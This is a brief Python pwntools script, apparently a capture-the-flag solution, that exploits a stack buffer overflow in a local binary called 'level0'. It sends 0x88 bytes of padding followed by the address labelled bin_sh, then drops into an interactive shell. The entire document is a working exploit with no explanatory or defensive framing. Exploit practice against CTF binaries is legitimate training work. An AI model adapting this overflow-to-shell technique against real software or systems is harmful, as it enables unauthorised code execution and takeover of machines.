# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='amd64')

Debug=1

if Debug:
    io=process('./level0')
else:
    pass

buf=0x00007FFEB1ACCA20
ret=0x00007FFEB1ACCAA8
bin_sh=0x0000000000400596

def main():
    io.recv()
    io.sendline((ret-buf)*'a'+p64(bin_sh))
    io.interactive()

main()